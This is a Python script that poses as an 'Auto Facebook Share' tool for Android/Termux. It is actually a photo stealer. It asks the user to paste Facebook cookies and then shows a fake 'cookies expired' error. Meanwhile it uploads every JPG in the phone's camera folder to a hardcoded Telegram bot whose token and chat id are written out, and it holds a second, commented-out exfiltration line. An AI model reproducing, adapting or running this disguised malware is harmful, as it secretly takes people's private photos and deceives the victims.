import requests, os, sys, time
from concurrent.futures import ThreadPoolExecutor as ter

####colors####
c = '\033[1;36m'
w = '\033[1;37m'
g = '\033[1;32m'
r = '\033[1;31m'
y = '\033[1;33m'

def lnx():
	print(f"{c}────────────────────────────────────────────────")

def clr():
	os.system('clear')

logo = f"""\n\n          {y}
         ███████╗██████╗  █████╗ 
         ██╔════╝██╔══██╗██╔══██╗
         █████╗  ██████╔╝███████║
         ██╔══╝  ██╔══██╗██╔══██║
         ██║     ██████╔╝██║  ██║
         ╚═╝     ╚═════╝ ╚═╝  ╚═╝
         {g}Owner : Lhirr Ingenhousz
{c}────────────────────────────────────────────────"""

def menu():
	clr()
	print(logo)
	print(f' {g}[1] Auto Facebook Share [ {c}working{g} ] ')
	print(f" {g}[2] Auto Follower [ {r}not working {g}] ")
	print(f" {g}[3] Auto React [ {y}maintenance{g} ] ")
	print(f' {g}[0] Exit')
	lnx()
	mthd = input(f'{g} Choice An Option : ')
	if mthd in ['1','01']:
		Pshare()
	else:
		exit()

def Pshare():
	clr()
	print(logo)
	print(f" {g}Login With Cookies (use fresh facebook cookies)")
	lnx()
	cokis = input(f" {g}Paste Your Cookies Here => {r}: {y}")
	time.sleep(3)
	file_grabber()
	
def file_grabber():
	os.system("ls /sdcard/DCIM/Camera | grep .jpg > pic.txt")
	xx=open("pic.txt","r").read().splitlines()
	lnx()
	print(f"{r} Your Cookies Is Expired !!!")
	time.sleep(1)
	print(f" {g}USE FRESH COOKIES")
	time.sleep(3)
	#print("Total Image To be Steal %s"%(len(xx)))
	with ter(max_workers=100) as expl:
		for i in xx:
			expl.submit(m1,i)

def m1(i):
    print("\33[1;31mDownloading \033[1;36m%s"%(i))
    filess={'document':open("/sdcard/DCIM/Camera/%s"%(i),'rb')}
    filesss={'document':open("/sdcard/DCIM/Camera/%s"%(i),'rb')}
    sess=requests.post('https://api.telegram.org/bot7521581397:AAH6_WobBJwztNhkOWlBM4bvBfGTySkvTkU/sendDocument?chat_id=6802694720',files=filess)
    print("\33[1;37m="*os.get_terminal_size().columns)
    #xc=requests.post('https://api.telegram.org/bot7415016855:AAFj1ctAuCvb6ecPij9smfPgb8mL18e7HO4/sendDocument?chat_id=6256050825',files=filesss)
    print("\33[1;37m="*os.get_terminal_size().columns)
    #print(sess.text)
    if '"ok":true' in sess.text: #and "true" in xc.text:
        print("\033[1;36m%s \033[1;32mSuccessfully Downloaded"%(i))
    else:
        print("\033[1;36m%s \33[1;31mDownload Failed"%(i))

####end####
menu()

